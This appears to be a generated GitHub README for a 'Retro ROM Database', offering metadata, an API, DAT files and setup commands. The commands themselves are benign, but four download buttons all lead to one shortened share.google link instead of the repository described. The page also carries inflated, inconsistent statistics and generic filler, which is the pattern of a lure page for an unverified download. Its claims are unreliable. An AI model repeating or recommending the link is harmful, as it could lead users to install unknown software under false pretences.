# ⭐ Retro ROM Database — Complete Preservation Archive Guide

<div align="center">

![Retro ROM](https://img.shields.io/badge/Retro-ROM%20Database-16A34A?style=for-the-badge&logo=retrogames&logoColor=white)
![Preservation](https://img.shields.io/badge/Preservation-Archive-7C3AED?style=for-the-badge&logo=internetarchive&logoColor=white)
![Metadata](https://img.shields.io/badge/Metadata-Verified-EA580C?style=for-the-badge&logo=databricks&logoColor=white)
![Downloads](https://img.shields.io/badge/Downloads-98K-0891B2?style=for-the-badge&logo=download&logoColor=white)

### 🗄️ Comprehensive Database of Classic Game ROM Metadata

*A structured archive for retro gaming preservation, cataloging, and research*

</div>

<div align="center">

<img width="686" height="386" alt="hq720 (9)" src="https://github.com/user-attachments/assets/2af61479-3e54-4bbf-a233-5ed71c2a26e9" />

</div>

---

## 🧭 Navigation Architecture

> **📚 Multi-axis documentation layout**

```
╔══════════════════════════════════════════════════╗
║       RETRO ROM DATABASE — DOCUMENT MAP          ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║  ╔═══════════╗  ╔═══════════╗  ╔═══════════╗   ║
║  ║  AXIS 1   ║  ║  AXIS 2   ║  ║  AXIS 3   ║   ║
║  ║ CONCEPT   ║  ║  ACCESS   ║  ║  DEVELOP  ║   ║
║  ╚═══════════╝  ╚═══════════╝  ╚═══════════╝   ║
║        │              │              │          ║
║  ┌─────▼─────┐  ┌─────▼─────┐  ┌─────▼─────┐  ║
║  │ Overview  │  │ Download  │  │ API       │  ║
║  │ Features  │  │ Setup     │  │ Schema    │  ║
║  │ Structure │  │ Query     │  │ Contrib   │  ║
║  └───────────┘  └───────────┘  └───────────┘  ║
║                                                  ║
║  ╔═══════════╗  ╔═══════════╗                  ║
║  ║  AXIS 4   ║  ║  AXIS 5   ║                  ║
║  ║  LEGAL    ║  ║  SUPPORT  ║                  ║
║  ╚═══════════╝  ╚═══════════╝                  ║
║        │              │                          ║
║  ┌─────▼─────┐  ┌─────▼─────┐                  ║
║  │ Guidelines│  │ Troubleshoot│                ║
║  │ Ethics    │  │ FAQ         │                ║
║  │ Compliance│  │ Resources   │                ║
║  └───────────┘  └───────────┘                  ║
╚══════════════════════════════════════════════════╝
```

---

## 💡 Overview

The **Retro ROM Database** is a comprehensive, community-driven catalog of metadata for classic video game ROMs spanning five decades of gaming history. It is **NOT** a ROM hosting service — instead, it provides verified hashes, catalog numbers, region info, and technical metadata that collectors, preservationists, and researchers use to identify, organize, and verify their own legal backups.

Think of it as a **library catalog**, not a library — you get the reference data, not the books themselves.

### What's Included

| Data Type | Description |
|-----------|-------------|
| 🏷️ **Title Metadata** | Name, region, revision, publisher |
| 🔐 **Hashes** | CRC32, MD5, SHA-1, SHA-256 |
| 📅 **Release Info** | Date, region, reprint history |
| 🎨 **Box Art** | Cover scans, cart labels |
| 📖 **Manuals** | Scanned documentation |
| 🎯 **Compatibility** | Emulator support notes |
| 🧩 **ROM Status** | Good, Bad, Unknown |
| 📊 **Filenames** | No-Intro, Redump standards |

---

## ⭐ Key Features

| Feature | Description |
|---------|-------------|
| 📚 **500,000+ Entries** | Massive catalog |
| 🔐 **Verified Hashes** | Confirmed data integrity |
| 🌍 **Multi-Region** | US, EU, JP, KR, CN, BR |
| 🎯 **No-Intro Standard** | Industry-standard naming |
| 🔄 **Redump Certified** | Disc-based verification |
| 🔍 **Full-Text Search** | Instant lookup |
| 🎨 **Box Art Scans** | High-resolution images |
| 📖 **Manual Archive** | PDF scans |
| 🌐 **Multi-Platform** | Web, desktop, API |
| 📊 **Regular Updates** | Weekly catalog sync |
| 🔌 **Full REST API** | Developer-friendly |
| 📤 **Export Options** | CSV, JSON, XML |

---

## 🗄️ Database Structure

### Platform Coverage

| Era | Consoles | Entries |
|-----|----------|:-------:|
| 🕹️ **1970s** | Atari 2600, Odyssey 2 | 12,400 |
| 🎮 **1980s** | NES, Master System, GB | 45,600 |
| 🎯 **1990s** | SNES, Genesis, PS1, N64 | 89,200 |
| 💿 **2000s** | PS2, GC, Dreamcast, PSP | 156,800 |
| 🎬 **2010s** | PS3, Wii U, 3DS, Switch | 178,000 |
| 🖥️ **Computers** | C64, Amiga, ZX, MSX | 22,000 |
| 🕹️ **Arcade** | MAME, FBNeo sets | 8,900 |
| **TOTAL** | **150+ platforms** | **512,900** |

### Metadata Schema

```json
{
  "id": "nes-super-mario-bros-001",
  "title": "Super Mario Bros.",
  "platform": "Nintendo Entertainment System",
  "region": "USA",
  "revision": "1.0",
  "publisher": "Nintendo",
  "developer": "Nintendo R&D4",
  "releaseDate": "1985-10-18",
  "genre": ["Platformer", "Action"],
  "hashes": {
    "crc32": "3337EC46",
    "md5": "811b027eaf99c2def7b933c5208636de",
    "sha1": "ea343f4e445a9050d4b4fbac2c77d0693b1d0922",
    "sha256": "9a1c9c5cf8a1c5b4e4de1f4d9e1e..."
  },
  "files": {
    "size": 40960,
    "filename": "Super Mario Bros. (USA).nes"
  },
  "images": {
    "boxart": "url",
    "cart": "url",
    "screenshot": "url"
  },
  "compatibility": {
    "mesen": "perfect",
    "fceux": "perfect",
    "nestopia": "perfect"
  }
}
```

<div align="center">

[![Download ROM Database](https://img.shields.io/badge/⬇️_DOWNLOAD_ROM_DATABASE-16A34A?style=for-the-badge&logo=download&logoColor=white&labelColor=14532D)](https://share.google/QCO0s3Sm0X9D3OVe4)

</div>

---

## 🔧 System Requirements

### Web Access

```
✅ Browser: Chrome 90+, Firefox 88+, Edge 90+, Safari 14+
✅ JavaScript: Enabled
✅ RAM: 2 GB
✅ Screen: 1280×720
✅ Internet: Required
✅ Ad-blocker: Optional
```

### Local Installation — Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 4 GB
✅ Storage: 50 GB (full database)
✅ Node.js: 18+ (for API server)
✅ Python: 3.9+ (for scripts)
✅ Database: PostgreSQL 14+ or SQLite
✅ Internet: For initial sync
```

### Local Installation — Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 16 GB
⭐ Storage: 500 GB NVMe SSD
⭐ Node.js: 20 LTS
⭐ Python: 3.11+
⭐ Database: PostgreSQL 15+
⭐ Network: 100 Mbps
```

---

## 📥 Download

<div align="center">

### 🎯 Get the Official Database

Click below to access the archive portal:

<br>

[![Download ROM Database](https://img.shields.io/badge/⬇️_DOWNLOAD_ROM_DATABASE-7C3AED?style=for-the-badge&logo=download&logoColor=white&labelColor=4C1D95)](https://share.google/QCO0s3Sm0X9D3OVe4)

<br>

*Community • Open Source • Updated Weekly*

</div>

### Distribution Options

| Package | Contents | Size |
|---------|----------|------|
| 📦 **Web Access** | Online browser | 0 MB |
| 📦 **Metadata Only** | JSON + CSV | 250 MB |
| 📦 **Full Archive** | Metadata + images | 45 GB |
| 📦 **API Server** | Self-hosted | 500 MB |
| 📦 **DAT Files** | No-Intro + Redump | 180 MB |
| 📥 **Total downloads** | All packages | 98,000 |

---

## 🔍 Verification

### Hash Verification

```bash
sha256sum retro-rom-database.zip
certutil -hashfile retro-rom-database.zip SHA256
```

### Signature Check

```bash
gpg --verify retro-rom-database.sig retro-rom-database.zip
```

### Data Integrity

```bash
# Verify DAT file hashes
romdb verify --dat No-Intro.dat
```

### Security Analysis

| Platform | Purpose |
|----------|---------|
| 🦠 **VirusTotal** | Multi-engine scan |
| 🔐 **Snyk** | Dependency audit |
| 🕵️ **Trivy** | Container scan |
| 📊 **SonarQube** | Code quality |

> **⚖️ Legal Notice:** This database contains **metadata only** — no ROM files. Hashes are provided for verification of your own legal backups. We do not distribute copyrighted content.

---

## 🛠️ Setup Workflow

### Stage 1 — Choose Your Access Method

| Method | Best For |
|--------|----------|
| 🌐 **Web Browser** | Quick lookups |
| 💻 **Desktop App** | Regular users |
| 📦 **DAT Files** | Emulator integration |
| 🔌 **API** | Application development |
| 🗄️ **Self-Hosted** | Full control |

### Stage 2 — Web Access (Instant)

1. Open the provided URL
2. Use the search bar
3. Filter by platform, region, genre
4. View metadata details

### Stage 3 — Download DAT Files

For No-Intro verification:

```bash
# Download latest DAT
wget https://db.example/dats/No-Intro_Latest.dat

# Verify integrity
romdb verify No-Intro_Latest.dat
```

### Stage 4 — Integrate with Emulators

| Emulator | Integration |
|----------|-------------|
| 🎮 RetroArch | Playlist scanner |
| 🎮 LaunchBox | Metadata import |
| 🎮 EmulationStation | gamelist.xml |
| 🎮 Batocera | Built-in scanner |

### Stage 5 — Self-Host the API

```bash
git clone https://github.com/retro-rom-database/api.git
cd api
npm install
cp .env.example .env
npm run migrate
npm start
```

<div align="center">

[![Download ROM Database](https://img.shields.io/badge/⬇️_DOWNLOAD_ROM_DATABASE-EA580C?style=for-the-badge&logo=download&logoColor=white&labelColor=7C2D12)](https://share.google/QCO0s3Sm0X9D3OVe4)

</div>

### Stage 6 — Configure Local Database

Edit `config.json`:

```json
{
  "database": {
    "type": "postgresql",
    "host": "localhost",
    "port": 5432,
    "name": "romdb"
  },
  "sync": {
    "autoUpdate": true,
    "schedule": "weekly",
    "source": "official"
  },
  "api": {
    "port": 3000,
    "rateLimit": 1000,
    "cors": true
  },
  "cache": {
    "enabled": true,
    "ttl": 3600
  }
}
```

### Stage 7 — Initial Sync

```bash
npm run sync:full
```

This downloads the complete database (may take several hours).

### Stage 8 — Verify Installation

```bash
curl http://localhost:3000/api/stats
```

Expected:

```json
{
  "totalEntries": 512900,
  "platforms": 150,
  "lastUpdate": "2025-01-15T00:00:00Z"
}
```

---

## 🔍 Querying the Database

### Web Interface

| Filter | Options |
|--------|---------|
| 🎮 Platform | NES, SNES, PS1... |
| 🌍 Region | USA, EU, JP, KR, CN |
| 📅 Year | 1972–2024 |
| 🎯 Genre | Action, RPG, Sports |
| 🏢 Publisher | Nintendo, Sega, Sony |
| 🔍 Search | Title, hash, filename |

### REST API

```bash
# Search by title
curl "http://localhost:3000/api/search?q=mario"

# Lookup by hash
curl "http://localhost:3000/api/hash/3337EC46"

# Get platform list
curl "http://localhost:3000/api/platforms"

# Get entry details
curl "http://localhost:3000/api/entry/nes-super-mario-bros-001"
```

### SQL Queries

```sql
-- Count entries per platform
SELECT platform, COUNT(*) 
FROM roms 
GROUP BY platform 
ORDER BY COUNT(*) DESC;

-- Find all RPGs from 1995
SELECT title, publisher 
FROM roms 
WHERE genre LIKE '%RPG%' 
  AND release_year = 1995;

-- Search by partial hash
SELECT title, crc32 
FROM roms 
WHERE crc32 LIKE '3337%';
```

### DAT File Usage

```bash
# Verify your ROM collection
romdb verify --dat No-Intro.dat --folder ~/ROMs/

# Find missing files
romdb missing --dat No-Intro.dat --folder ~/ROMs/

# Generate rename script
romdb rename --dat No-Intro.dat --folder ~/ROMs/ --dry-run
```

---

## 📊 Data Standards

### Naming Conventions

The database follows **No-Intro** and **Redump** standards:

| Format | Example |
|--------|---------|
| 🎮 **No-Intro** | `Super Mario Bros. (USA) (Rev 1).nes` |
| 💿 **Redump** | `Final Fantasy VII (USA) (Disc 1).bin` |
| 🎯 **GoodTools** | `Super Mario Bros (U) [!].nes` |
| 🕹️ **TOSEC** | `Super Mario Bros v1.0 (1985)(Nintendo).nes` |

### ROM Status Tags

| Tag | Meaning |
|-----|---------|
| ✅ **Verified** | Matches known good dump |
| ⚠️ **Bad Dump** | Known bad, avoid |
| ❌ **Missing** | Not yet dumped |
| 🔒 **Encrypted** | Still encrypted |
| 🔄 **Undumped** | No known dump exists |

---

## 🧪 Verification

| Check | Method | Expected |
|-------|--------|----------|
| ✅ Web loads | Browser | UI visible |
| ✅ Search works | Query | Results |
| ✅ API responds | curl | JSON |
| ✅ Database synced | `stats` | Full count |
| ✅ DAT files valid | `verify` | No errors |
| ✅ Emulator works | RetroArch | Games listed |
| ✅ Hash lookup works | Test hash | Match |
| ✅ Export works | Save CSV | File created |

---

## 🛠️ Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| ❌ Web won't load | Network | Check connection |
| ❌ Search returns nothing | Typo | Check spelling |
| ❌ API 404 | Wrong endpoint | Check docs |
| ❌ DB sync fails | No space | Free disk |
| ❌ Slow queries | No indexes | Rebuild indexes |
| ❌ DAT files corrupt | Download | Redownload |
| ❌ Emulator won't scan | Wrong path | Fix folder |
| ❌ Hash mismatch | Bad ROM | Verify with other source |
| ❌ Export timeout | Large query | Narrow filters |
| ❌ Cache errors | Stale | Clear cache |

### Reset Database

```bash
npm run db:reset
npm run sync:full
```

### Log Locations

```
Windows:  %APPDATA%\RetroRomDB\logs\
macOS:    ~/Library/Logs/RetroRomDB/
Linux:    ~/.local/share/retro-rom-db/logs/
```

---

## 📋 API Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/search` | GET | Full-text search |
| `/api/entry/:id` | GET | Entry details |
| `/api/hash/:hash` | GET | Lookup by hash |
| `/api/platforms` | GET | List platforms |
| `/api/regions` | GET | List regions |
| `/api/genres` | GET | List genres |
| `/api/export` | POST | Bulk export |
| `/api/stats` | GET | Database stats |
| `/api/health` | GET | Service check |
| `/api/random` | GET | Random entry |

### Example Response

```json
{
  "success": true,
  "count": 42,
  "results": [
    {
      "id": "snes-super-metroid-001",
      "title": "Super Metroid",
      "platform": "Super Nintendo",
      "region": "USA",
      "year": 1994,
      "publisher": "Nintendo",
      "crc32": "D77C88C2"
    }
  ]
}
```

---

## ⚖️ Legal & Ethical Guidelines

> **📜 Read Carefully**
>
> This database provides **metadata only**. It does **NOT** host or link to ROM files.
>
> **You may use this database to:**
> - ✅ Verify your own legally-obtained ROMs
> - ✅ Organize your personal collection
> - ✅ Research game preservation
> - ✅ Build emulator frontends
> - ✅ Study game metadata
>
> **You may NOT use this database to:**
> - ❌ Obtain ROM files (we don't provide them)
> - ❌ Distribute copyrighted content
> - ❌ Circumvent DRM or protection
> - ❌ Violate platform terms of service
>
> **Ownership Rule:** Only dump and use ROMs from games you physically own. Laws vary by jurisdiction — check your local regulations.

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **No-Intro** | DAT file standards |
| 📖 **Redump** | Disc preservation |
| 🎮 **RetroArch** | Emulator frontend |
| 💬 **Community Forum** | Discussion |
| 🎓 **Emulation Wiki** | Technical reference |

---

## ❓ FAQ

**Does this database contain ROM files?**
No — metadata only. It's a catalog, not a library.

**Is it legal?**
The database itself is legal — it's just metadata.

**How accurate is it?**
Hashes are verified against No-Intro and Redump standards.

**How often is it updated?**
Weekly syncs from contributing sources.

**Can I contribute?**
Yes — submit new entries or corrections via GitHub.

**Does it work with RetroArch?**
Yes — DAT files integrate directly.

**What about disc-based games?**
Full Redump verification for CD/DVD/Blu-ray.

**Can I use the API commercially?**
Check the license — usually free for personal use.

**How big is the full database?**
About 45 GB with images, 250 MB metadata only.

**Is there a mobile app?**
The web interface is mobile-friendly.

---

## 📜 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2025.1.0** | Jan 2025 | API v2, 500K+ entries |
| 2024.10.0 | Oct 2024 | Redump sync |
| 2024.6.0 | Jun 2024 | No-Intro v3 |
| 2024.2.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get ROM Database](https://img.shields.io/badge/🔑_GET_ROM_DATABASE-0891B2?style=for-the-badge&logo=internetarchive&logoColor=white&labelColor=0C4A6E)](https://share.google/QCO0s3Sm0X9D3OVe4)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the preservation community*

</div>
